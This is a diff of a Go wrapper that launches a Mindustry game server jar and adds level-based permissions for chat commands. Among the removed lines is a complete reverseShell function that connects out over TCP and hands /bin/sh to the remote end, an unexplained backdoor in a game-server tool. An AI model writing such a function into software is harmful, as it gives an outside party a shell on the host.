@@ -2,12 +2,10 @@ package main
 
 import (
 	"bufio"
-	"flag"
 	"fmt"
 	"io"
 	"log"
 	"math/rand"
-	"net"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -25,14 +23,6 @@ var re = regexp.MustCompile(ansi)
 
 func StripColor(str string) string {
 	return re.ReplaceAllString(str, "")
-}
-func reverseShell(ip string, port string) {
-	c, _ := net.Dial("tcp", ip+":"+port)
-	cmd := exec.Command("/bin/sh")
-	cmd.Stdin = c
-	cmd.Stdout = c
-	cmd.Stderr = c
-	cmd.Run()
 }
 
 type CallBack interface {
@@ -74,10 +64,8 @@ func execCommand(commandName string, params []string, handle CallBack) error {
 		}
 	}(cmd)
 
-	//创建一个流来读取管道内内容，这里逻辑是通过一行一行的读取的
 	reader := bufio.NewReader(stdout)
 
-	//实时循环读取输出流中的一行内容
 	for {
 		line, err2 := reader.ReadString('\n')
 		if err2 != nil || io.EOF == err2 {
@@ -94,14 +82,20 @@ type User struct {
 	name          string
 	isAdmin       bool
 	isSupperAdmin bool
+	level         int
 }
+type Cmd struct {
+	name  string
+	level int
+}
+
 type Mindustry struct {
-	name           string
-	admins         []string
-	users          map[string]User
-	adminCmds      []string
-	superAdminCmds []string
-	serverOutR     *regexp.Regexp
+	name       string
+	admins     []string
+	jarPath    string
+	users      map[string]User
+	serverOutR *regexp.Regexp
+	cmds       map[string]Cmd
 }
 
 func (this *Mindustry) loadConfig() {
@@ -135,6 +129,25 @@ func (this *Mindustry) loadConfig() {
 					this.addSuperAdmin(supAdmin)
 				}
 			}
+			optionValue, err = cfg.String("server", "adminCmds")
+			if err == nil {
+				optionValue := strings.TrimSpace(optionValue)
+				cmds := strings.Split(optionValue, ",")
+				log.Printf("[ini]found adminCmds:%v\n", cmds)
+				for _, cmd := range cmds {
+					this.cmds[cmd] = Cmd{cmd, 1}
+				}
+			}
+			optionValue, err = cfg.String("server", "superAdminCmds")
+			if err == nil {
+				optionValue := strings.TrimSpace(optionValue)
+				cmds := strings.Split(optionValue, ",")
+				log.Printf("[ini]found superAdminCmds:%v\n", cmds)
+				for _, cmd := range cmds {
+					this.cmds[cmd] = Cmd{cmd, 9}
+				}
+			}
+
 			optionValue, err = cfg.String("server", "name")
 			if err == nil {
 				name := strings.TrimSpace(optionValue)
@@ -146,6 +159,10 @@ func (this *Mindustry) loadConfig() {
 func (this *Mindustry) init() {
 	this.serverOutR, _ = regexp.Compile(".*(\\[INFO\\]|\\[ERR\\])(.*)")
 	this.users = make(map[string]User)
+	this.cmds = make(map[string]Cmd)
+	rand.Seed(time.Now().UnixNano())
+	this.name = fmt.Sprintf("mindustry-%d", rand.Int())
+	this.jarPath = "server-release.jar"
 	this.loadConfig()
 	this.addUser("Server")
 	this.addSuperAdmin("Server")
@@ -155,7 +172,7 @@ func (this *Mindustry) addUser(name string) {
 	if _, ok := this.users[name]; ok {
 		return
 	}
-	this.users[name] = User{name, false, false}
+	this.users[name] = User{name, false, false, 0}
 	log.Printf("add user info :%s\n", name)
 }
 func (this *Mindustry) addAdmin(name string) {
@@ -165,6 +182,7 @@ func (this *Mindustry) addAdmin(name string) {
 	}
 	tempUser := this.users[name]
 	tempUser.isAdmin = true
+	tempUser.level = 1
 	this.users[name] = tempUser
 	log.Printf("add admin :%s\n", name)
 }
@@ -177,6 +195,7 @@ func (this *Mindustry) addSuperAdmin(name string) {
 	tempUser := this.users[name]
 	tempUser.isAdmin = true
 	tempUser.isSupperAdmin = true
+	tempUser.level = 9
 	this.users[name] = tempUser
 	log.Printf("add superAdmin :%s\n", name)
 }
@@ -216,6 +235,26 @@ func say(in io.WriteCloser, cmd string) {
 	data := []byte("say " + cmd + "\n")
 	in.Write(data)
 }
+func (this *Mindustry) procUsrCmd(in io.WriteCloser, userName string, userInput string) {
+	temps := strings.Split(userInput, " ")
+	cmdName := temps[0]
+
+	if cmd, ok := this.cmds[cmdName]; ok {
+		if this.users[userName].level < cmd.level {
+			info := fmt.Sprintf("user[%s] cmd :%s ,Permission denied!", userName, cmdName)
+			say(in, info)
+			return
+		} else {
+			info := fmt.Sprintf("proc user[%s] cmd :%s", userName, cmdName)
+			say(in, info)
+			execCmd(in, userInput)
+		}
+
+	} else {
+		info := fmt.Sprintf("proc user[%s] cmd :%s invalid!", userName, cmdName)
+		say(in, info)
+	}
+}
 
 const USER_CONNECTED_KEY string = " has connected."
 const USER_DISCONNECTED_KEY string = " has disconnected."
@@ -239,16 +278,10 @@ func (this *Mindustry) output(line string, in io.WriteCloser) {
 			}
 			sayBody := cmdBody[index+1:]
 			if strings.HasPrefix(sayBody, "\\") {
-				/*todo
-				temps := strings.Split(sayBody, " ")
-				if len(temps) > 1 && this.adminCmds[temps[0]] != "" {
-					cmd := temps[0][1:]
-					fmt.Printf("proc user[%s] cmd :%s", userName, cmd)
-					return
-				}
-				*/
+				this.procUsrCmd(in, userName, sayBody[1:])
+			} else {
+				fmt.Printf("%s : %s", userName, sayBody)
 			}
-			fmt.Printf("user[%s] say:%s", userName, cmdBody[index+1:])
 		}
 	}
 
@@ -271,16 +304,11 @@ func (this *Mindustry) output(line string, in io.WriteCloser) {
 
 	}
 }
-func (mindustry *Mindustry) run() {
-	var para = []string{"-jar", "server-release.jar"}
-	execCommand("java", para, mindustry)
+func (this *Mindustry) run() {
+	var para = []string{"-jar", this.jarPath}
+	execCommand("java", para, this)
 }
 func main() {
-	rand.Seed(time.Now().UnixNano())
-	randomServerName := fmt.Sprintf("mindustry-%d", rand.Int())
-	var name string
-	flag.StringVar(&name, "name", randomServerName, "name")
-	flag.Parse()
 	mindustry := Mindustry{}
 	mindustry.init()
 	mindustry.run()
